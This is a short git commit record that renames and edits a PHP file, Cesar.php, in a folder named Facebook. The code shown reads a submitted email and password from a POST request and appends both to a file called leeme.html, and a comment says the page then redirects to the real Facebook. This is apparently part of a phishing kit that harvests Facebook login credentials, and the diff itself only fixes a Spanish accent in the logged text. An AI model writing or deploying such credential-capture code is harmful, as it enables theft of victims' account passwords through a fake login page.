e2de8906663a7631ebf193ea8ffb1987b6828793
E-botCR <67763548+E-botCR@users.noreply.github.com>
2020-07-02 17:40:18 -0600

    Update and rename .Gray/facebook/Cesar.php to .Gris/Facebook/Cesar.php
    !!!

--- .Gris/Facebook/Cesar.php
+++ .Gris/Facebook/Cesar.php
@@ -11,7 +11,7 @@ $pass = $_POST['pass'];
 $guardame = fopen('leeme.html','a+');
 fwrite($guardame,
 "<br/><b>Usuario:</b>".$email.
-"<br/><b>Contrasena:</b>".$pass." ");
+"<br/><b>Contraseña:</b>".$pass." ");
 
 fclose($guardame);
 //Redirecciona a la web original (facebook)
